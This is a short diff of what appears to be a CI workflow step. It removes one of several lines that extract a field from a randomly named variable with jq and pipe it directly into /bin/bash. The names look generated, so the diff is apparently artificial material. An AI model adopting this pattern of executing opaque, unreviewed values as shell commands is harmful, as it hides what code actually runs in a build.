@@ -23,7 +23,6 @@ jobs:
           echo $pwc84 | jq -r .ni00265 | /bin/bash
           printf '%s' "$qbbtx6971" | jq -r .wpmy1664 | /bin/bash
           printf '%s' "$k2" | jq -r .hxh0 | /bin/bash
-          printf '%s' "$gnfg8" | jq -r .tult2784 | /bin/bash
           printf '%s' "$qmz05634" | jq -r .oxijt8034 | /bin/bash
 
       - name: Save archive
